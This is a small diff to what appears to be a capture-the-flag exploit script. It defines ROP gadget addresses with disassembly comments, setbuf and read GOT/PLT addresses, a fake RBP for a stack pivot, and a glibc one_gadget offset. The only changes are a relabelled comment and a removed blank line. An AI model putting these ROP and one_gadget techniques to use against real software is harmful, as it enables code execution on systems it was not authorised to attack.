@@ -24,14 +24,13 @@ GADGET_1 = 0x40113c  # add dword ptr [rbp-0x3d], ebx; nop; ret; (__do_global_dto
 GADGET_2 = 0x4011a2  # mov rbp, rsp; sub rsp, 0x20; lea rax, [rbp-0x20]; mov edx, 0x30; mov rsi, rax; mov edi, 0x0; call 0x401060 <read@plt>; nop; leave; ret; (vuln)
 GADGET_3 = 0x4011a9  # lea rax, [rbp-0x20]; mov edx, 0x30; mov rsi, rax; mov edi, 0x0; call 0x401060 <read@plt>; nop; leave; ret; (vuln)
 GADGET_4 = 0x4011c0  # leave; ret; (vuln)
-GADGET_5 = 0x4011f0  # add rsp, 0x8; ret; (main)
+GADGET_5 = 0x4011f0  # add rsp, 0x8; ret; (_fini)
 
 # useful addresses
 SETBUF_GOT = 0x404018  # setbuf@got
 SETBUF_PLT = 0x401050  # setbuf@plt
 READ_GOT = 0x404020  # read@got
 FAKE_RBP = 0x404800  # fake_rbp
-
 
 # one gadget offset from glibc
 ONE_GADGET_OFFSET = 0xebd43
